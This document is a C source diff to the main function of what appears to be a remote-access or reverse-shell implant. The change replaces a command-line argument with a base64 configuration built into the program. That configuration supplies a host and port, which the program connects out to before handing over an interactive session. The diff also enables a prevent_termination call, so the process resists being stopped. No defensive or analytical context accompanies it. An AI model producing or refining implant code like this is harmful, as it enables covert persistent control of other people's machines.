@@ -34,30 +34,24 @@
 #include "console.h"
 #include "channel.h"
 
-int main(int argc, char *argv[])
+char data[1024] = ":data:string:";
+
+int main(void)
 {
-    if (argc > 1) {
-        // redirect_to_null();
+    prevent_termination();
 
-        // prevent_termination();
-        // prevent_reboot();
+    char *input = decode_base64(data);
+    JSONObject *json = parseJSON(input);
 
-        char *input = decode_base64(argv[1]);
-        JSONObject *json = parseJSON(input);
+    char *host = find_json(json, "host");
+    char *port = find_json(json, "port");
 
-        char *host = find_json(json, "host");
-        char *port = find_json(json, "port");
+    int channel = open_channel(host, atoi(port));
+    if (channel < 0)
+        return -1;
 
-        freeJSONFromMemory(json);
-
-        int channel = open_channel(host, atoi(port));
-        if (channel < 0)
-            return -1;
-
-        interact(channel);
-        close_channel(channel);
-    } else
-        return 1;
+    interact(channel);
+    close_channel(channel);
 
     return 0;
 }
